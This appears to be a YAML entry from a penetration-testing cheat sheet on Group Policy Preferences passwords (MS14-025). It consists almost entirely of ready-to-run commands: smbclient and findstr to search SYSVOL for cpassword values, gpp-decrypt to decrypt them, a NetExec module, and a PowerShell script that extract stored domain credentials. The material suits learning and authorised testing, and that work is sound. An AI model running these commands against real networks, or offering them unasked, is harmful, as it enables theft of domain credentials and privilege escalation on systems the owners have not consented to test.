---
description: |
  Group Policy Preferences (GPP) passwords — extract and decrypt stored credentials from SYSVOL Group Policy XML files (MS14-025).
commands:
  - have: Credentials
    cmd: |
      # Browse SYSVOL for GPP XML files
      smbclient //10.10.10.27/SYSVOL -U sec_user%'P@ssw0rd'

      # Search SYSVOL for cpassword entries
      findstr /S cpassword \\10.10.10.27\sysvol\*.xml

      # Decrypt GPP cpassword string
      gpp-decrypt "encrypted_cpassword_string"

      # NetExec — automated GPP password extraction
      nxc smb 10.10.10.27 -u sec_user -p 'P@ssw0rd' -M gpp_password

      # PowerShell — Get-GPPPassword from domain-joined host
      Import-Module .\Get-GPPPassword.ps1
      Get-GPPPassword
  - have: Shell
    cmd: |
      # Search SYSVOL from domain-joined host
      findstr /S cpassword \\senshu.sh\sysvol\senshu.sh\Policies\*.xml

      # Decrypt found cpassword value
      gpp-decrypt "encrypted_cpassword_string"
phase:
  - Post-Exploitation
target_os:
  - Windows
services:
  - SMB
techniques:
  - GPP_Passwords
references:
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html
  - https://www.netexec.wiki/
  - https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30
---
